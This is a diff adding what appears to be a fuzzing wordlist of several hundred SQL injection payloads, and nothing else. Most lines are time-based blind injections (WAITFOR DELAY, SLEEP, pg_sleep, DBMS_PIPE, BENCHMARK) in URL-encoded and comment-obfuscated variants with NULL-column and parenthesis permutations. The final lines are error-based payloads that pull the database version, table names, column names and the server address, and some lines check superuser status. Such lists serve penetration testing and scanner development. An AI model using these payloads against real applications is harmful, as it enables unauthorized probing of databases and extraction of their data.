@@ -1,0 +1,479 @@
+%27%3BWAITFOR%2F**%2FDELAY%2F**%2FN%270%3A0%3A5%27--
+'%20waitfor%20delay'0%3a0%3a5'--
+'; IF (1=1) WAITFOR DELAY '0:0:10';--
+'; SELECT IF(1=1, SLEEP(10), 0);--
+1' AND SLEEP(10)-- -
+' OR EXISTS (SELECT 1 FROM pg_sleep(10)) -- ';
+%27%3B%20SELECT%20IF%281%3D1%2C%20SLEEP%2810%29%2C%200%29%3B--
+1%20AND%20SLEEP(10)
+%27%3B/**/SElECT/**/IF%281%3D1%2C/**/SLEeP%2810%29%2C/**/0%29%3B--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END;--
+select 1 from pg_sleep(5)
+;(select 1 from pg_sleep(5))
+||(select 1 from pg_sleep(5))
+1'; SELECT (decode('70675F736C656570', 'hex'))(5)--
+%27%3B%20SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%20pg_sleep%2810%29%20ELSE%20pg_sleep%280%29%20END%3B--
+1%27%3B%20SELECT%20CASE%20WHEN%20%28%28SELECT%20usesuper%20FROM%20pg_user%20WHERE%20usename%20%3D%20current_user%29%20%3D%20false%29%20THEN%20pg_sleep%2810%29%20ELSE%20pg_sleep%280%29%20END%3B--
+1%27%3B%20SELECT%20CASE%20WHEN%20%28%28SELECT%20usesuper%20FROM%20pg_user%20WHERE%20usename%20%3D%20current_user%29%20%3D%20true%29%20THEN%20pg_sleep%2810%29%20ELSE%20pg_sleep%280%29%20END%3B--
+select%201%20from%20pg_sleep(5)
+%3B%28select%201%20from%20pg_sleep%285%29%29
+%7C%7C%28select%201%20from%20pg_sleep%285%29%29
+%27%3BSELECT/**/CASE/**/WHEN/**/1%3D1/**/THEN/**/pg_sleep%2810%29/**/ELSE/**/pg_sleep%280%29/**/END%3B--
+'; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END IF; END;--
+' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
+' AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
+%27%20AND%201337%3D%28CASE%20WHEN%20%281%3D1%29%20THEN%20DBMS_PIPE.RECEIVE_MESSAGE%28%27RANDSTR%27%2C10%29%20ELSE%201337%20END%29
+%27%20AND%20%5BRANDNUM%5D%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27%5BRANDSTR%5D%27%2C%5BSLEEPTIME%5D%29
+%27%3B%20BEGIN%20IF%201%3D1%20THEN%20DBMS_PIPE.RECEIVE_MESSAGE%28%27a%27%2C10%29%3B%20END%20IF%3B%20END%3B--
+%27%3BBEGIN/**/IF/**/1%3D1/**/THEN/**/DBMS_PIPE.RECEIVE_MESSAGE%28%27a%27%2C10%29%3B/**/END/**/IF%3B/**/END%3B--
+0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X
+0"XOR(if(now()=sysdate(),sleep(10),0))XOR"Z
+‘ AND (SELECT 8839 FROM (SELECT(SLEEP(5)))uzIY) AND ‘mSUA’=’mSUA
+'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z
+X'XOR(if(now()=sysdate(),/**/sleep(5)/**/,0))XOR'X
+X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X
+X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
+'XOR(SELECT(0)FROM(SELECT(SLEEP(9)))a)XOR'Z
+(SELECT(0)FROM(SELECT(SLEEP(6)))a)
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
+1 AND (SELECT(0)FROM(SELECT(SLEEP(9)))a)-- wXyW
+(SELECT * FROM (SELECT(SLEEP(5)))a)
+'%2b(select*from(select(sleep(5)))a)%2b'
+CASE//WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END
+');(SELECT 4564 FROM PG_SLEEP(5))--
+)%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--
+')%20waitfor%20delay%20'0:0:20'%20/*
+')%20waitfor%20delay%20'0:0:20'%20--
+")%20waitfor%20delay%20'0:0:20'%20/*
+")%20waitfor%20delay%20'0:0:20'%20--
+))%20waitfor%20delay%20'0:0:20'%20/*
+))%20waitfor%20delay%20'0:0:20'%20--
+'))%20waitfor%20delay%20'0:0:20'%20/*
+'))%20waitfor%20delay%20'0:0:20'%20--
+"))%20waitfor%20delay%20'0:0:20'%20/*
+"))%20waitfor%20delay%20'0:0:20'%20--
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+',NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+ waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /* 
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+') waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /* 
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+')) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /* 
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /* 
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /* 
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /* 
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /* 
+")))))) waitfor delay '0:0:20' --
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+" and 0=benchmark(3000000,MD5(1))%20/*
+" and 0=benchmark(3000000,MD5(1))%20--
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+") and 0=benchmark(3000000,MD5(1))%20/*
+") and 0=benchmark(3000000,MD5(1))%20--
+") and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20%23
+")) and 0=benchmark(3000000,MD5(1))%20/*
+")) and 0=benchmark(3000000,MD5(1))%20--
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20--
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20--
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+1' AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -
+1' AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -
+1' AND CAST((SELECT version()) AS INT)=1337 -- -
+1' AND (SELECT version())::int=1 -- -
+1'AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
+1'AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
+1'AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
+1'CAST((SELECT @@version) AS INT)
+' and 0=CAST((SELECT VERSION()) AS INT)--
+' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--
+' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--
+';SELECT CAST(CAST(QUERY_TO_XML('SELECT ...',TRUE,TRUE,'') AS TEXT) AS INT)--
+' AND 1=CAST((SELECT inet_server_addr()) AS INT) --
+1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)--
+1' AND 1=(SELECT (decode('43415354', 'hex'))((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER))--
+1' AND (SELECT 1 FROM nonexistent_table WHERE 1=1)=1--
+1' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)=1--
+1' AND (SELECT (decode('53454C454354', 'hex')) 1 FROM nonexistent_table WHERE 1=1)=1--
+1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))--
+1' AND (SELECT (UNHEX('4558545241435456414C5545'))(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1))))--
+1' AND 1=(SELECT table_name FROM information_schema.tables LIMIT 1)--
+1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS UNSIGNED)--
